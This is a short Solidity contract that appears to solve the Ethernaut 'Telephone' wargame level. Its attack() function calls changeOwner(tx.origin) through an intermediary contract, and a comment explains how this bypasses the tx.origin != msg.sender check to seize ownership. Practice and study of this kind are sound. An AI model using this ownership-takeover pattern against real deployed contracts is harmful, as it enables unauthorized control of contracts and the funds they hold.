// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;


import "./Telephone.sol";
import "hardhat/console.sol";

contract TelephoneS {
    Telephone public telephone;

    constructor(address _telephone) {
        telephone = Telephone(_telephone);
    }

    /* I attacked the telephone smart contract to pass the first
       condition tx.origin != msg.sender, in order to take the ownership of the contract
       I need to specify tx.origin as an argument.
    */
    function attack() external payable {
      telephone.changeOwner(tx.origin);
    }

}